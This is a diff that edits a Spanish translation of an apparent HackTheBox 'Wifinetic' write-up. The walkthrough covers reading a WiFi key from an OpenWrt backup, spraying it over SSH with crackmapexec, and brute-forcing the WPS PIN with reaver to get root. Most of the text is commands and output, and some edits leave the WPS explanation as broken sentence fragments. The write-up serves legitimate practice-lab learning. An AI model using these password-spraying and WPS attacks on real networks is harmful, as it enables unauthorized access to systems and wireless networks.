@@ -122,16 +122,16 @@ local: employees_wellness.pdf remote: employees_wellness.pdf
 * `MigrateOpenWrt.txt`&#x20;
 * `backup-OpenWrt-2023-07-26.tar`&#x20;
 
-Profundizando en la copia de seguridad, hay una `etc`carpeta:
+**Navegar por la carpeta `etc`**
 
-```
-oxdf@hacky$ ls etc
+```bash
+ls etc
 config  dropbear  group  hosts  inittab  luci-uploads  nftables.d  opkg  passwd  profile  rc.local  shells  shinit  sysctl.conf  uhttpd.crt  uhttpd.key
 ```
 
-La mayoría de estos no tienen mucho de interesante. `passwd`proporciona una lista de nombres de usuario:
+**`passwd` contiene una lista de nombres de usuario:**
 
-```
+```bash
 root:x:0:0:root:/root:/bin/ash
 daemon:*:1:1:daemon:/var:/bin/false
 ftp:*:55:55:ftp:/home/ftp:/bin/false
@@ -144,16 +144,14 @@ ubus:x:81:81:ubus:/var/run/ubus:/bin/false
 netadmin:x:999:999::/home/netadmin:/bin/false
 ```
 
-El `config`directorio tiene un puñado de archivos:
-
-```
-oxdf@hacky$ ls etc/config/
+```bash
+ls etc/config/
 dhcp  dropbear  firewall  luci  network  rpcd  system  ucitrack  uhttpd  wireless
 ```
 
-El único que tiene algo útil es `wireless`:
+**El único que tiene algo útil es `wireless`**
 
-```
+```bash
 oxdf@hacky$ cat etc/config/wireless 
 
 config wifi-device 'radio0'
@@ -189,20 +187,20 @@ config wifi-iface 'wifinet1'
         option key 'VeRyUniUqWiFIPasswrd1!'
 ```
 
-Está definiendo dos dispositivos, cada uno con una interfaz. Hay una clave precompartida (PSK o contraseña) para una red WiFi.
+**Está definiendo dos dispositivos, cada uno con una interfaz. Hay una clave precompartida (PSK o contraseña) para una red WiFi.**
 
-#### DNS-TCP/USP 53 <a href="#dns---tcpusp-53" id="dns---tcpusp-53"></a>
+### DNS-TCP/USP 53 <a href="#dns---tcpusp-53" id="dns---tcpusp-53"></a>
 
-Dado el uso de `wifinetic.htb`en los documentos, lo agregaré a mi `/etc/hosts`archivo:
+**`wifinetic.htb` lo agregaré a mi `/etc/hosts archivo`**
 
-```
+```bash
 10.10.11.247 wifinetic.htb
 ```
 
-Dado que DNS está escuchando en TCP, intentaré una transferencia de zona para ver si hay subdominios:
+**DNS está escuchando en TCP, intentaré una transferencia de zona para ver si hay subdominios**
 
-```
-oxdf@hacky$ dig asxf @10.10.11.247 wifinetic.htb
+```bash
+dig asxf @10.10.11.247 wifinetic.htb
 ;; communications error to 10.10.11.247#53: timed out
 ;; communications error to 10.10.11.247#53: timed out
 ;; communications error to 10.10.11.247#53: timed out
@@ -229,16 +227,14 @@ wifinetic.htb.          0       IN      A       10.10.11.247
 ;; MSG SIZE  rcvd: 58
 ```
 
-No estoy seguro de por qué se agota el tiempo al principio, pero eventualmente lo logra y encuentra solo el dominio principal.
-
 ### Shell como administrador de red <a href="#shell-as-netadmin" id="shell-as-netadmin"></a>
 
 #### Fuerza bruta de contraseña SSH <a href="#ssh-password-bruteforce" id="ssh-password-bruteforce"></a>
 
-Con la contraseña de la configuración Wifi, la usaré `crackmapexec`para probar cada usuario del `passwd`archivo con la contraseña de la configuración inalámbrica a través de SSH. Me gusta usar `--continue-on-success`en caso de que haya más de un usuario que comparta esa contraseña. Encuentra uno:
+**Con la contraseña de la configuración Wifi, `crackmapexec`para probar cada usuario del `passwd`archivo con la contraseña de la configuración inalámbrica a través de SSH.Usar `--continue-on-success`en caso de que haya más de un usuario que comparta esa contraseña.**&#x20;
 
-```
-oxdf@hacky$ crackmapexec ssh 10.10.11.247 -u users -p 'VeRyUniUqWiFIPasswrd1!' -
+```bash
+crackmapexec ssh 10.10.11.247 -u users -p 'VeRyUniUqWiFIPasswrd1!' -
 ontinue-on-success
 SSH         10.10.11.247    22     10.10.11.247     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
 SSH         10.10.11.247    22     10.10.11.247     [-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
@@ -255,33 +251,29 @@ SSH         10.10.11.247    22     10.10.11.247     [+] netadmin:VeRyUniUqWiFIPa
 
 #### Caparazón <a href="#shell" id="shell"></a>
 
-Puedo conectarme con ese nombre de usuario/contraseña:
+**Puedo conectarme con ese nombre de usuario/contraseña:**
 
-```
-oxdf@hacky$ sshpass -p 'VeRyUniUqWiFIPasswrd1!' ssh netadmin@10.10.11.247
+```bash
+sshpass -p 'VeRyUniUqWiFIPasswrd1!' ssh netadmin@10.10.11.247
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
 ...[snip]...
 netadmin@wifinetic:~$ 
 ```
 
-Y lea la bandera del usuario:
+**Y lea la bandera del usuario:**
 
-```
+```bash
 netadmin@wifinetic:~$ cat user.txt
 e5540a0a************************
 ```
 
 ### Shell como raíz <a href="#shell-as-root" id="shell-as-root"></a>
 
-#### Enumeración <a href="#enumeration" id="enumeration"></a>
-
-**Sistema de archivos**
-
 **Directorios de inicio**
 
-El directorio de inicio del usuario netadmin está básicamente vacío:
+**El directorio de inicio del usuario netadmin está básicamente vacío:**
 
-```
+```bash
 netadmin@wifinetic:~$ ls -la
 total 28
 drwxr-xr-x  3 netadmin netadmin 4096 Sep 11 16:40 .
@@ -294,22 +286,22 @@ drwx------  2 netadmin netadmin 4096 Sep 11 16:40 .cache
 -rw-r-----  1 root     netadmin   32 Sep 13 11:01 user.txt
 ```
 
-Hay muchos otros usuarios con directorios de inicio en `/home`:
+**Hay muchos otros usuarios con directorios de inicio en `/home`:**
 
-```
+```bash
 netadmin@wifinetic:/home$ ls
 ayoung33   dwright27   janderson42  lturner56  mrobinson78  owalker17  sjohnson88  tclark84
 bwhite3    eroberts25  jletap77     mhughes12  netadmin     pharris47  swood93
 dmorgan99  jallen10    kgarcia22    mickhat    nlee61       rturner45  tcarter90
 ```
 
-Todos son iguales, con algunos archivos estándar y un `.ssh`directorio al que netadmin no puede acceder.
+**Todos son iguales, con algunos archivos estándar y un `.ssh`directorio al que netadmin no puede acceder.**
 
 **/optar**
 
-`/opt`tiene un `share`directorio que parece coincidir con lo que está disponible a través de FTP:
+**`/opt`tiene un `share`directorio que parece coincidir con lo que está disponible a través de FTP:**
 
-```
+```bash
 netadmin@wifinetic:/opt$ ls
 share
 netadmin@wifinetic:/opt$ cd share/
@@ -318,9 +310,9 @@ backup-OpenWrt-2023-07-26.tar  MigrateOpenWrt.txt         ProjectOpenWRT.pdf
 employees_wellness.pdf         ProjectGreatMigration.pdf
 ```
 
-El `vsftpd.conf`archivo `/etc/`confirma esto (usando `grep`para eliminar líneas que comienzan con un marcador de comentario `#`):
+**El `vsftpd.conf`archivo `/etc/`confirma esto (usando `grep`para eliminar líneas que comienzan con un marcador de comentario `#`):**
 
-```
+```bash
 netadmin@wifinetic:/etc$ cat vsftpd.conf  | grep -v "^#"
 listen=NO
 listen_ipv6=YES
@@ -348,9 +340,9 @@ ssl_enable=NO
 
 **Binarios privilegiados**
 
-Siempre buscaré binarios SetUID y SetGID interesantes. Las herramientas de enumeración como \[LinPEAS])() también las identificarán:
+**Siempre buscaré binarios SetUID y SetGID interesantes. Las herramientas de enumeración como \[LinPEAS])() también las identificarán:**
 
-```
+```bash
 netadmin@wifinetic:~$ find / -perm -4000 -or -perm -2000 2>/dev/null
 /usr/local/lib/python3.8
 /usr/local/lib/python3.8/dist-packages
@@ -386,11 +378,7 @@ netadmin@wifinetic:~$ find / -perm -4000 -or -perm -2000 2>/dev/null
 /run/log/journal
 ```
 
-![expandir](https://0xdf.gitlab.io/icons/expand.png)
-
-Todos estos parecen estándar. También buscaré binarios con capacidades:
-
-```
+```bash
 netadmin@wifinetic:~$ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 /usr/bin/ping = cap_net_raw+ep
@@ -399,13 +387,9 @@ netadmin@wifinetic:~$ getcap -r / 2>/dev/null
 /usr/bin/reaver = cap_net_raw+ep
 ```
 
-¡El último salta! [¡ Reaver](https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html) es una herramienta para descifrar WPS!
-
 **Interfaces Wi-Fi**
 
-En cuanto a las interfaces de red, ¡hay seis!
-
-```
+```bash
 netadmin@wifinetic:~$ ifconfig
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
@@ -459,20 +443,20 @@ wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-`eth0`es la interfaz LAN estándar que tiene la IP 10.10.11.247 que he estado atacando. `lo`es la interfaz localhost estándar con 127.0.0.1.
+**`eth0`es la interfaz LAN estándar que tiene la IP 10.10.11.247 que he estado atacando. `lo`es la interfaz localhost estándar con 127.0.0.1.**
 
-`mon`Las interfaces (como `mon0`) se utilizan normalmente para interfaces en modo monitor. Esto se utiliza para rastrear y monitorear el tráfico en una red WiFi. `wlan`Las interfaces (como las otras tres) se utilizan para interactuar con redes inalámbricas.
+**`mon`Las interfaces (como `mon0`) se utilizan normalmente para interfaces en modo monitor. Esto se utiliza para rastrear y monitorear el tráfico en una red WiFi. `wlan`Las interfaces (como las otras tres) se utilizan para interactuar con redes inalámbricas.**
 
-Las configuraciones inalámbricas generalmente se almacenan en `/etc/wpa_supplicant.conf`, que está presente, pero netadmin no puede leerlo:
+**Las configuraciones inalámbricas generalmente se almacenan en `/etc/wpa_supplicant.conf`, que está presente, pero netadmin no puede leerlo**
 
-```
+```bash
 netadmin@wifinetic:/etc$ cat wpa_supplicant.conf 
 cat: wpa_supplicant.conf: Permission denied
 ```
 
-`iw dev`Dará más información sobre las interfaces inalámbricas:
+**`iw dev`Dará más información sobre las interfaces inalámbricas**
 
-```
+```bash
 netadmin@wifinetic:~$ iw dev
 phy#2
         Interface mon0
@@ -512,29 +496,27 @@ phy#0
                 txpower 20.00 dBm
 ```
 
-Esto brinda mucha información sobre cada interfaz de red física, así como sobre las interfaces en ellas.
+**`wlan0`Está encendido `phy0`. Se está ejecutando como un punto de acceso ( `type AP`) con SSID `OpenWrt`en el canal 1.**
 
-`wlan0`Está encendido `phy0`. Se está ejecutando como un punto de acceso ( `type AP`) con SSID `OpenWrt`en el canal 1.
+**`wlan1`está activado `phy1`y se ejecuta en modo "administrado", lo que sugiere que es un cliente. Dado que el SSID, el canal y la frecuencia central son los mismos que `wlan0`, este es un cliente en ese punto de acceso.**
 
-`wlan1`está activado `phy1`y se ejecuta en modo "administrado", lo que sugiere que es un cliente. Dado que el SSID, el canal y la frecuencia central son los mismos que `wlan0`, este es un cliente en ese punto de acceso.
-
-`wlan2`y `mon0`están encendidos `phy2`. `wlan2`También actúa como cliente (en modo "administrado"), mientras que as `mon0`está en modo monitor como se sospecha. `wlan2`no muestra ninguna conexión.
+**`wlan2`y `mon0`están encendidos `phy2`. `wlan2`También actúa como cliente (en modo "administrado"), mientras que as `mon0`está en modo monitor como se sospecha. `wlan2`no muestra ninguna conexión.**
 
 #### Fuerza bruta WPA <a href="#wpa-brute-force" id="wpa-brute-force"></a>
 
-**Fondo**
+**Background**
 
 La configuración protegida WiFi (WPS) es un estándar diseñado para facilitar la conexión a un enrutador WiFi, especialmente en entornos domésticos. El dispositivo tendría un PIN de 8 dígitos impreso en el dispositivo y el usuario podría ingresar ese PIN para unirse a la red.
 
-Hay un problema con la implementación que hace que sea trivial aplicar fuerza bruta al pin de 8 dígitos. En teoría, esto debía ofrecer cien millones de pines posibles. En la práctica, el sistema WPS le dirá si los primeros cuatro dígitos son correctos y luego si los siguientes tres dígitos son correctos. También utiliza el último dígito como suma de verificación. Esto significa que para lograr una fuerza bruta eficaz, un atacante sólo necesita probar 10.000 posibilidades para los primeros cuatro, 1.000 para los siguientes cuatro o como máximo 11.000 pines (¡mucho menos de cien millones!).
+Hay un problema con la implementación que hace que sea trivial aplicar fuerza bruta al pin de 8 dígitos.&#x20;
 
-Reaver es una herramienta que se utiliza para recuperar la red WPA PSK (contraseña) mediante fuerza bruta en el pin WPS.
+En la práctica, el sistema WPS le dirá si los primeros cuatro dígitos son correctos y luego si los siguientes tres dígitos son correctos. También utiliza el último dígito como suma de verificación. Esto significa que para lograr una fuerza bruta eficaz.
 
-**Uso del atracador**
+**Reaver** es una herramienta que se utiliza para recuperar la red WPA PSK (contraseña) mediante fuerza bruta en el pin WPS.
 
-La ejecución `reaver`muestra dos argumentos obligatorios:
+**Reaver**
 
-```
+```bash
 netadmin@wifinetic:~$ reaver
 
 Reaver v1.6.5 WiFi Protected Setup Attack Tool
@@ -580,15 +562,13 @@ Example:
         reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
 ```
 
-Necesito el nombre de la interfaz en modo monitor y el BSSID del AP de destino. El ejemplo en la parte inferior `reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv`muestra que el BSSID parece una dirección MAC y, de hecho, [lo es](https://en.wikipedia.org/wiki/Service\_set\_\(802.11\_network\)) .
+Necesito el nombre de la interfaz en modo monitor y el BSSID del AP de destino. El ejemplo en la parte inferior `reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv`muestra que el BSSID parece una dirección MAC.
 
-**Ejecutar atracador**
+**Ejecutar Reaver**
 
-El AP de destino es `wlan0`, que tiene una MAC del `iw`comando anterior de `02:00:00:00:00:00`. La interfaz en modo monitor es `mon0`. La mayoría de `reaver`los tutoriales muestran el uso del `wash`comando para obtener el BSSID/MAC. Esto no funciona aquí y lo veré en [Beyond Root](https://0xdf.gitlab.io/2023/09/16/htb-wifinetic.html#beyond-root) .
+El AP de destino es `wlan0`, que tiene una MAC del `iw`comando anterior de `02:00:00:00:00:00`. La interfaz en modo monitor es `mon0`.&#x20;
 
-Los usaré para ejecutar `reaver`:
-
-```
+```bash
 netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv
 
 Reaver v1.6.5 WiFi Protected Setup Attack Tool
@@ -621,11 +601,9 @@ Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetso
 [+] Nothing done, nothing to save.
 ```
 
-Muy rápidamente puede descifrar la contraseña WPA (o clave precompartida (PSK)) de la red inalámbrica.
+#### Su/SSH <a href="#su--ssh" id="su--ssh"></a>
 
-#### su/SSH <a href="#su--ssh" id="su--ssh"></a>
-
-Esta contraseña funciona como contraseña para root en el cuadro, ya sea `su`en una sesión existente:
+**Esta contraseña funciona como contraseña para root en el cuadro, ya sea `su`en una sesión existente:**
 
 ```
 netadmin@wifinetic:~$ su -
@@ -633,35 +611,33 @@ Password:
 root@wifinetic:~#
 ```
 
-O iniciar una nueva sesión SSH:
+**O iniciar una nueva sesión SSH:**
 
-```
+```bash
 oxdf@hacky$ sshpass -p 'WhatIsRealAnDWhAtIsNot51121!' ssh root@10.10.11.247
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
 ...[snip]...
 root@wifinetic:~# 
 ```
 
-De cualquier manera, puedo agarrar `root.txt`:
+**De cualquier manera, puedo agarrar `root.txt`:**
 
-```
+```bash
 root@wifinetic:~# cat root.txt
 b8e6c359************************
 ```
 
 ### Más allá de la raíz <a href="#beyond-root" id="beyond-root"></a>
 
-#### Fondo <a href="#background-1" id="background-1"></a>
-
-La mayoría de los tutoriales que muestran cómo ejecutar `reaver`usarán algo como `wash -i mon0`obtener los BSSID de las redes disponibles y enumerar si el WPS está bloqueado (lo que hace que sea mucho menos probable que funcione la fuerza bruta).
+**Background**
 
 `wash`es una herramienta que forma parte de `reaver`y está destinada a enumerar redes. Pero requiere la `CAP_NET_RAW`capacidad, al igual que `reaver`hace.
 
-Es inusual realizar este ataque sin root en el cuadro atacante. Normalmente, este ataque se realiza desde el hardware del controlador del atacante en las proximidades locales de la red WiFi. Pero incluso si alguien lo hace desde una caja comprometida, necesitará root, ya que es _muy_ poco probable que `reaver`se encuentre con las capacidades necesarias en el mundo real, como es el caso de HTB.
+Es inusual realizar este ataque sin root en el cuadro atacante. Normalmente, este ataque se realiza desde el hardware del controlador del atacante en las proximidades locales de la red WiFi. Pero incluso si alguien lo hace desde una caja comprometida, necesitará root, ya que es _muy_ poco probable que `reaver`se encuentre con las capacidades necesarias en el mundo real.
 
-#### Ejecutando lavado como netadmin <a href="#running-wash-as-netadmin" id="running-wash-as-netadmin"></a>
+#### Ejecutando wash como netadmin <a href="#running-wash-as-netadmin" id="running-wash-as-netadmin"></a>
 
-Con un shell no root en el cuadro, si intento ejecutar `wash -i mon0`como se recomienda y simplemente se cuelga:
+**Con un shell no root en el cuadro, si intento ejecutar `wash -i mon0`como se recomienda y simplemente se cuelga:**
 
 ```
 netadmin@wifinetic:~$ wash -i mon0
@@ -671,11 +647,7 @@ BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 
 #### Revisión de la fuente <a href="#source-review" id="source-review"></a>
 
-El código fuente `wash`está [aquí](https://github.com/t6x/reaver-wps-fork-t6x/blob/bd0f38262224c1b88ba9f1f95cb5476a488d2295/src/wpsmon.c#L155) , comenzando con la `wash_main`función. No soy un experto en C, pero parece que está trabajando activamente en la red.
-
-Hay una función llamada `send_probe_request` [aquí](https://github.com/t6x/reaver-wps-fork-t6x/blob/bd0f38262224c1b88ba9f1f95cb5476a488d2295/src/wpsmon.c#L595) que envía un paquete. También hay un bucle `next_packet`. En base a esto, tiene mucho sentido que `wash`necesite algún tipo de capacidad o privilegio de root para poder funcionar. De hecho, recibo errores cuando intento ejecutar `wash`en alguna otra interfaz:
-
-```
+```bash
 netadmin@wifinetic:~$ wash -i wlan0
 [X] ERROR: pcap_activate status -1
 [X] PCAP: generic error code
@@ -690,11 +662,11 @@ netadmin@wifinetic:~$ wash -i wlan2
 couldn't get pcap handle, exiting
 ```
 
-#### Ejecutar lavado como raíz <a href="#run-wash-as-root" id="run-wash-as-root"></a>
+#### Ejecutar wash como raíz <a href="#run-wash-as-root" id="run-wash-as-root"></a>
 
 En este punto, parece que se trata claramente de una cuestión de permisos. Por eso es sorprendente cuando ejecutar como root da el mismo resultado:
 
-```
+```bash
 root@wifinetic:~# wash -i mon0
 BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 --------------------------------------------------------------------------------
@@ -702,7 +674,7 @@ BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 
 Curiosamente, ahora se cuelga en lugar de fallar `wlan0`y `wlan1`:
 
-```
+```bash
 root@wifinetic:~# wash -i wlan0
 BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 --------------------------------------------------------------------------------
@@ -715,7 +687,7 @@ BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 
 Más interesante aún, funciona en `wlan2`:
 
-```
+```bash
 root@wifinetic:~# wash -i wlan2
 BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 --------------------------------------------------------------------------------
@@ -724,7 +696,7 @@ BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 
 Aún _más_ interesante, cuando ejecuté esto en `wlan2`, lo estaba `wash -i mon0`ejecutando en otra terminal y se imprimió el resultado al mismo tiempo:
 
-```
+```bash
 root@wifinetic:~# wash -i mon0
 BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
 --------------------------------------------------------------------------------
